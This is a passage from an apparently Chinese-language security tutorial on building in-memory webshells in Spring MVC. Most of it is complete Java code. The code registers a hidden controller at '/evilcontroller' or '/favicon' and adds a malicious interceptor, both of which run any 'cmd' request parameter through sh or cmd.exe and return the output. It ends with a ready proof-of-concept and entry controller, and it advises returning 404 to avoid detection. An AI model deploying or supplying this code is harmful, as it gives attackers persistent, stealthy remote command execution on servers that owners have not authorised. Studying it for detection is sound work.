        public String inject() throws Exception{
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Method method = InjectedController.class.getMethod("cmd");
            PatternsRequestCondition url = new PatternsRequestCondition("/evilcontroller");
            RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
            RequestMappingInfo info = new RequestMappingInfo(url, condition, null, null, null, null, null);
            InjectedController injectedController = new InjectedController();
            requestMappingHandlerMapping.registerMapping(info, injectedController, method);
            return "Inject done";
        }
        @RestController
        public class InjectedController {
            public InjectedController(){
            }
            public void cmd() throws Exception {
                HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
                HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
                if (request.getParameter("cmd") != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    response.getWriter().write(output);
                    response.getWriter().flush();
                    response.getWriter().close();
                }
            }
        }
    }
先访问Inject进行controller注册。然后访问controller映射路径evilcontroller，带上参数就能RCE
除此以外，还有两种方式能模拟注册Controller
②detectHandlerMethods直接注册
上面指出：在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo
该方法接收handler参数，就能寻找到bean并注册controller
    //1.在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
    context.getBeanFactory().registerSingleton("dynamicController", Class.forName("org.example.springmvc.InjectedController").newInstance());
    // 2. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
    // 3. 反射获得 detectHandlerMethods Method
    java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
    m1.setAccessible(true);
    //4.将 dynamicController 注册到 handlerMap 中
    m1.invoke(requestMappingHandlerMapping, "dynamicController");
③利用registerHandler
上面的方法适用于spring3.1后RequestMappingHandlerMapping为映射器。当用DefaultAnnotationHandlerMapping为映射器时。该类顶层父类的registerHandler接收urlPath参数和handler参数来注册controller。不过不常用了，贴一下利用方法：
    // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
    context.getBeanFactory().registerSingleton("dynamicController", Class.forName("org.example.springmvc.InjectedController").newInstance());
    // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
    org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
    // 3. 反射获得 registerHandler Method
    java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
    m1.setAccessible(true);
    // 4. 将 dynamicController 和 URL 注册到 handlerMap 中
    m1.invoke(dh, "/favicon", "dynamicController");
还可以加个else不带参数时返回404状态码，减少被检测到的概率
## Interceptor拦截器内存马构造
Interceptor和Tomcat和Filter过滤器很类似。区别如下：
  1. Interceptor基于反射，Filter基于函数回调
  2. Interceptor不依赖servlet容器
  3. Interceptor只能对action请求有用
  4. Interceptor可以访问action上下文，栈里的对象。Filter不能
  5. action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次
  6. Interceptor可以获取IOC容器中的bean，Filter不行
由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作
#### 源码分析
DispatcherServlet.doDispatch中，进行了getHandler，持续跟进发现最终调用的是AbstractHandlerMapping#getHandler()，该方法中调用了getHandlerExecutionChain()
该方法从adaptedInterceptors中把符合的拦截器添加到chain里。adaptedInterceptors就存放了全部拦截器
返回到DispatcherServlet#doDispatch()，getHandler后执行了applyPreHandle遍历执行了拦截器。
而且可以看到applyPreHandle后面就是ha.handle()，执行controller，所以说Interceptors是在controller之前执行的
师傅给出了Filter,controller,Interceptors执行的顺序：
  * preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。
  * postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
  * afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。
### 1\. 获取RequestMappingHandlerMapping
因为是在AbstractHandlerMapping类中，用addInterceptor向拦截器chain中添加的。该类是抽象类，可以获取其实现类RequestMappingHandlerMapping。一样的，前面提了四种方法。
    WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
### 2.反射获取adaptedInterceptors
获取adaptedInterceptors，private属性，使用反射。并且传入RequestMappingHandlerMapping初始化
    Field field = null;
        try {
            field = RequestMappingHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List adaptInterceptors = null;
        try {
            adaptInterceptors = (List) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
### 3.添加恶意Interceptors
    adaptInterceptors.add(new InjectEvilInterceptor("a"));
恶意Interceptor:需要实现HandlerInterceptor接口，通过重写preHandle进行RCE
    public class InjectInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            if (request.getParameter("cmd") != null) {
                try{
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    response.getWriter().write(output);
                    response.getWriter().flush();
                    response.getWriter().close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return false;
            }
            return true;
        }
        @Override
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
        }
        @Override
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
            HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
        }
    }
### 测试：
过滤器和controller可以直接使用@RequestMapping注解进行URL映射。拦截器Interceptor需要手动编写一个Config添加进去，或者直接修改配置文件spingmvc.xml
POC：
    package org.example.springmvc;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.servlet.HandlerInterceptor;
    import org.springframework.web.servlet.ModelAndView;
    import org.springframework.web.servlet.handler.AbstractHandlerMapping;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.InputStream;
    import java.lang.reflect.Field;
    import java.util.List;
    import java.util.Scanner;
    public class InjectInterceptor implements HandlerInterceptor {
        static {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field field = null;
            try {
                field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            }
            field.setAccessible(true);
            List adaptInterceptors = null;
            try {
                adaptInterceptors = (List) field.get(mappingHandlerMapping);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            InjectInterceptor evilInterceptor = new InjectInterceptor();
            adaptInterceptors.add(evilInterceptor);
        }
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            if (request.getParameter("cmd") != null) {
                try{
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    response.getWriter().write(output);
                    response.getWriter().flush();
                    response.getWriter().close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return false;
            }
            return true;
        }
        @Override
        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
        }
        @Override
        public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
            HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
        }
    }
新建一个controller触发拦截器，作为入口
    package org.example.springmvc;
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestMapping;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    @Controller
    @RequestMapping("/InjectInterceptor")
    public class EvilController {
        @GetMapping
        public void index(HttpServletRequest request, HttpServletResponse response) {
            try {
                Class.forName("org.example.springmvc.InjectInterceptor");
                response.getWriter().println("Inject done!");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
参考：